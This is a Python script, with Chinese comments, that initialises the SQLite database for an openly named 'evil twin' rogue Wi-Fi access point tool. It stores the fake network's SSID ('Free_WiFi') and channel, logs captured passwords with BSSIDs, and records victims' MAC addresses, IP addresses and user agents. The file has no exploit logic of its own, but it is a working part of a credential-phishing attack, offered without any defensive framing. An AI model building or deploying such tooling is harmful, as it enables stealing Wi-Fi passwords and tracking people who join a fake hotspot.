# init_db.py
import sqlite3

def init_database():
    conn = sqlite3.connect('evil_twin.db')
    cursor = conn.cursor()
    
    # 创建表
    cursor.execute('''CREATE TABLE IF NOT EXISTS config (
        id INTEGER PRIMARY KEY CHECK (id = 1),
        evil_ssid TEXT NOT NULL DEFAULT 'Free_WiFi',
        evil_channel INTEGER DEFAULT 6,
        network_interface TEXT NOT NULL DEFAULT 'wlan0',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')

    # 兼容旧数据库：如果已有 config 表但缺 network_interface 字段
    try:
        cursor.execute("ALTER TABLE config ADD COLUMN network_interface TEXT NOT NULL DEFAULT 'wlan0'")
    except:
        pass
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS password_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        password TEXT NOT NULL,
        bssid TEXT,
        captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    cursor.execute('''CREATE TABLE IF NOT EXISTS mac_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        mac_address TEXT NOT NULL,
        ip_address TEXT,
        user_agent TEXT,
        captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    
    # 创建触发器
    cursor.execute('''DROP TRIGGER IF EXISTS limit_password_logs''')
    cursor.execute('''CREATE TRIGGER limit_password_logs 
        AFTER INSERT ON password_logs
        BEGIN
            DELETE FROM password_logs 
            WHERE id NOT IN (
                SELECT id FROM password_logs 
                ORDER BY captured_at DESC 
                LIMIT 10
            );
        END''')
    
    # 初始化默认配置
    cursor.execute("INSERT OR IGNORE INTO config (id, evil_ssid, evil_channel) VALUES (1, 'Free_WiFi', 6)")
    
    conn.commit()
    conn.close()
    print("Database initialized successfully!")

if __name__ == '__main__':
    init_database()
